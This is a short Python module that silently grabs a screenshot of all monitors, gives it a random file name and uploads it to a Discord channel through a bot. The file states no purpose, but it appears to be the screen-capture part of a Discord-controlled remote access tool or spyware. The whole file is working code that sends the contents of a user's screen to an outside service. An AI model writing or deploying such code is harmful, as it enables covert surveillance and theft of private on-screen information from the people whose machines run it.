import io
import discord
from PIL import ImageGrab, Image
import random
import string

# Helper function to generate a random file name
def generate_random_filename():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(10)) + ".png"

async def capture_and_send(bot, CHANNEL_ID):
    try:
        # Capture the entire virtual screen (captures all monitors)
        screenshot = ImageGrab.grab(all_screens=True)  # Capture all monitors as one large image
        screenshot = screenshot.convert("RGB")  # Convert to RGB for consistency

        # Save the screenshot to a buffer with lossless PNG compression
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")  # Use PNG for lossless compression
        buffer.seek(0)

        # Generate a random file name for the screenshot
        random_filename = generate_random_filename()

        # Send the screenshot to Discord
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            file = discord.File(fp=buffer, filename=random_filename)
            await channel.send(file=file)

    finally:
        buffer.close()
        del screenshot  # Clear screenshot data from memory
